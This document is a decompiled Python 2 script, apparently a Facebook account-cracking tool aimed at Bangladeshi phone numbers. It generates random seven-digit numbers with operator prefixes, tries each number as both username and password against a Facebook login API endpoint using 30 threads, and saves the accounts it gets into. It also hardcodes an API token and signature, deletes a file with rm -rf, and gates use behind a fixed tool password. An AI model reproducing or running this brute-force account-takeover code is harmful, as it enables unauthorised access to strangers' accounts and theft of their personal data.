# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-06-24 14:06:02.766595
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
os.system('clear')
logo1 = '\n\n\x1b[1;31;40m\n\x1b[97;1m   _____           ____       __ \n\x1b[96;1m  / ___/___  _____/ __ \\___  / /_\n\x1b[94;1m  \\__ \\/ _ \\/ ___/ / / / _ \\/ __/\n \x1b[91;1m___/ /  __/ /__/ /_/ /  __/ /_  \n\x1b[96;1m/____/\\___/\\___/_____/\\___/\\__/ \n'
print logo1
mrm = raw_input('\x1b[1;96m[?] \x1b[1;97mEnter Your User Agent \x1b[1;96m>>>> ')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', mrm + ';]')]

def exb():
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


logo = '\n\n\n\x1b[1;31;40m\n\x1b[97;1m   _____           ____       __ \n\x1b[96;1m  / ___/___  _____/ __ \\___  / /_\n\x1b[94;1m  \\__ \\/ _ \\/ ___/ / / / _ \\/ __/\n \x1b[91;1m___/ /  __/ /__/ /_/ /  __/ /_  \n\x1b[96;1m/____/\\___/\\___/_____/\\___/\\__/  \n\n\n\x1b[1;31;40m                   BD 07 Digit Cloning \n                                                \n\x1b[1;33;40m--------------------------------------------------\n  \x1b[1;36;40mAuthor     \x1b[1;33;40m: \x1b[0;37;40mAdnan Adif Hisham\n  \x1b[1;36;40mGitHub     \x1b[1;33;40m: \x1b[0;37;40mhttps://github.com/C4LLM3D3V1L\n  \x1b[1;36;40mFacebook   \x1b[1;33;40m: \x1b[0;37;40mhttps://Facebook.com/C4LL.M3.D3V1L\n  \x1b[1;36;40mPublic     \x1b[1;33;40m: \x1b[0;37;40m12-06-2022\n\x1b[1;33;40m--------------------------------------------------\n                               '
os.system('clear')
print logo
CorrectUsername = 'SECDET'
CorrectPassword = 'GF-CHAI'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;96m[?] \x1b[1;97mTool USERNAME \x1b[1;96m>>>> ')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;96m[?] \x1b[1;97mTool PASWORD \x1b[1;96m>>>> ')
        if password == CorrectPassword:
            print 'GF Hacked Successful....'
            loop = 'false'
        else:
            print '\x1b[1;91mWrong!,\x1b[1;92mText me to get the correct password'
            os.system('xdg-open https://github.com/C4LLM3D3V1L')
    else:
        print '\x1b[1;91mWrong!,\x1b[1;92mText me to get the correct username'
        os.system('xdg-open https://www.facebook.com/C4LL.M3.D3V1L')

back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    global cpb
    global oks
    os.system('clear')
    print logo
    print '\x1b[1;32;40mEnter Sim Code And + Any \x1b[1;31;40m1 \x1b[1;32;40mDigit Without Space  \n[ex] (178,167,198)\n\n\x1b[0;37;45m Grameenphone : 17*,13* \n Robi         : 18* \n Airtel       : 16* \n Banglalink   : 19*,14* '
    try:
        c = raw_input(' \n\n\t\x1b[1;32;40mChoose code \x1b[1;31;40m >>>>\x1b[1;35;40m ')
        k = '+880'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Back ]')
        menu()

    xxx = str(len(id))
    print 50 * '\x1b[1;33;40m-'
    psb('\x1b[1;32;40m[-_-] Please wait__')
    psb('[-_-] Total : 99999')
    time.sleep(0.5)
    psb('[-_-] Lets Start Hunting')
    time.sleep(0.5)
    print 50 * '\x1b[1;33;40m-'
    psb('\x1b[1;32;40mHacked Accouny Will Appear Here')
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('Adnan')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + user + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[*_*Hacked*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('adnan/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[Login After 7 Days] ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('adnan/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '-'
    print '[-_-] Process Has Been Completed ....'
    print '[-_-] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[-_-] CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('cat .README.md')


if __name__ == '__main__':
    menu()
